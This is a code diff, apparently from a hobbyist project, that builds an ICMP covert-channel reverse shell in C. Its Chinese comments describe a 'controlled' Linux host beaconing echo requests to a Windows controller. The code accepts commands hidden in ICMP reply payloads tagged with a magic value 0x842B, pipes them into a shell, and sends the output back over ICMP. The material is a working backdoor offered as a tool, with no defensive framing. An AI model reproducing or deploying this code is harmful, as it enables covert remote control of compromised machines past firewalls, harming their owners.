@@ -3,7 +3,23 @@
 
 来一个
 
-icmp 的一个 replay 包 和 一个 request 包要对应啊 
+icmp 的一个 replay 包 和 一个 request 包要对应...
+
+被控制的 linux 要发送 echo  request 包 
+然后 windows 这边需要关闭本机的 icmp echo 的功能 不响应 request 请求  然后我们的程序来发送 echo 请求 
+
+linux 需要先发一个包 过来 开始 shell --> 解决方案就是 不断的监听 监听到一个 icmp request 就向那个 ip 发送 icmp request 开始 shell
+然后 windows 的控制端 
+
+Linux 上面启动一个定时器 1s 发送一个 request 请求 看看是不是有数据了 
+
+linux 发送数据给 windows 只能通过 request 包 
+windows 发送数据给 Linux 只能通过 reply 包     因为我们不能给对方发送 request 包
+
+linux --zip--> windows
+ |               |
+ |               |
+ +--zip--0x842B--+
 */
 #include <stdio.h>
 #include <stdlib.h>
@@ -23,6 +39,8 @@ icmp 的一个 replay 包 和 一个 request 包要对应啊
 #include <sys/ioctl.h>
 #include <errno.h>
 #include <sys/wait.h>
+#include <sys/time.h>
+
 
 typedef unsigned int uint32;
 typedef unsigned short uint16;
@@ -36,20 +54,6 @@ typedef unsigned char uint8;
 #define IN_BUF_SIZE   1024  //接收数据的缓冲区的大小 
 #define OUT_BUF_SIZE  64
 
-typedef struct _cmd_context
-{
-    char *cmd;//要执行的命令
-    char *request;//请求包
-    uint32 ip;
-}cmd_context;
-
-enum GlobalStatus
-{
-    STATUS_SHELL_START = 0x2B,
-    STATUS_SHELL_EXIT,
-    STATUS_PROCESS_EXITING
-};
-
 int  g_icmp_sock = 0;
 int  g_CanThreadExit = 0; //线程是不是可以退出了。
 int  read_pipe[2];  //读取的管道
@@ -58,6 +62,25 @@ char *g_MyName = NULL;
 uint32 g_RemoteIp = 0;// 远程 ip 
 char *g_Cmd = NULL; //要执行的命令
 char *g_Request = NULL;//请求的数据吧
+
+char *g_hello_msg = "Icmp Shell V1.0 \nBy: sincoder \n";
+
+/*
+ from tcpdump  not thread safe
+*/
+#define IPTOSBUFFERS    12
+
+char *iptos(uint32 in)
+{
+    static char output[IPTOSBUFFERS][3*4+3+1];
+    static short which;
+    unsigned char *p;
+
+    p = (unsigned char *)&in;
+    which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
+    snprintf(output[which], sizeof(output[which]),"%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
+    return output[which];
+}
 
 /*
 创建一个线程 
@@ -106,12 +129,19 @@ unsigned short checksum(unsigned short *ptr, int nbytes)
     return rs;
 }
 
+uint16  random16()
+{
+    struct timeval tv;
+    gettimeofday(&tv,NULL);
+    return (uint16)tv.tv_sec * tv.tv_usec;
+}
+
 /*
 发送 icmp  echo request 包
 失败返回 -1
 成功返回 0
 */
-int  icmp_sendreplay(int icmp_sock, uint32 ip,uint8 *pdata,uint32 size)
+int  icmp_sendrequest(int icmp_sock, uint32 ip,uint8 *pdata,uint32 size)
 {
     struct icmphdr *icmp;
     struct sockaddr_in addr;
@@ -123,7 +153,11 @@ int  icmp_sendreplay(int icmp_sock, uint32 ip,uint8 *pdata,uint32 size)
     {
         return -1;
     }
-    icmp->type = 0;
+    icmp->type = 8;  // icmp  request
+    icmp->code = 0;
+    icmp->un.echo.id = random16();
+    icmp->un.echo.sequence = random16();
+
     memcpy(icmp + 1,pdata,size);
     memset(&addr,0,sizeof(struct sockaddr_in));
     addr.sin_family = AF_INET;
@@ -148,7 +182,7 @@ int  icmp_sendreplay(int icmp_sock, uint32 ip,uint8 *pdata,uint32 size)
 */
 int SendData(unsigned char *pData,int Size)
 {
-    return icmp_sendreplay(g_icmp_sock,g_RemoteIp,pData,Size);
+    return icmp_sendrequest(g_icmp_sock,g_RemoteIp,pData,Size);
 }
 
 void set_fd_noblock(int fd)
@@ -183,19 +217,37 @@ void *Icmp_RecvThread(void *lparam)
             {
                 nbytes -= sizeof(struct iphdr);
                 icmp = (struct icmphdr *) (ip + 1);
-                if(8 == icmp->type)  //只接受 icmp request 请求的
+                if(0 == icmp->type)  //只接受 icmp request 请求的
                 {
                     if (nbytes > sizeof(struct icmphdr))
                     {
                         nbytes -= sizeof(struct icmphdr);
-                        data = (char *) (icmp + 1);  //得到 icmp 头 后面的数据 
-                        data[nbytes] = '\0';
-                        dbg_msg("%s:icmp recv %s  \n",__func__, data);
-                        // 写到 shell 里面 
-                        data[nbytes] = '\n';  //发来的命令 里面 应该 不能含有 \n
-                        write(write_pipe[1],data,nbytes+1);
-                        fflush(stdout);
+                        if(nbytes > 2)
+                        {
+                            data = (char *) (icmp + 1);  //得到 icmp 头 后面的数据 
+                            if(0x842B == *(uint16 *)data)  //验证下是不是我们的客户端发的
+                            {
+                                data += 2;
+                                nbytes -= 2;
+                                data[nbytes] = '\0';
+                                dbg_msg("%s:icmp recv %s  \n",__func__, data);
+                                // 写到 shell 里面 
+                                data[nbytes] = '\n';  //发来的命令 里面 应该 不能含有 \n
+                                write(write_pipe[1],data,nbytes+1);
+                                fflush(stdout);
+
+                                //我们也要马上 发回一个 request 来看看 有木有数据了 此时要延时的 
+                            }
+                        }
                     }
+                }
+                else if(8 == icmp->type)
+                {
+                    //icmp request 
+                    //此时 发送 hello msg
+                    uint32 srcip = htonl(ip->saddr);
+                    dbg_msg("%s: recv a icmp request from %s \n",__func__,iptos(srcip));
+                    icmp_sendrequest(g_icmp_sock,srcip,(uint8 *)g_hello_msg,strlen(g_hello_msg)); //
                 }
             }
         }
@@ -209,7 +261,6 @@ void *Icmp_RecvThread(void *lparam)
     dbg_msg("%s: Thread exit ... \n",__func__);
     return NULL;
 }
-
 
 /*
 从管道中读取数据（命令执行的结果）并发送出去 
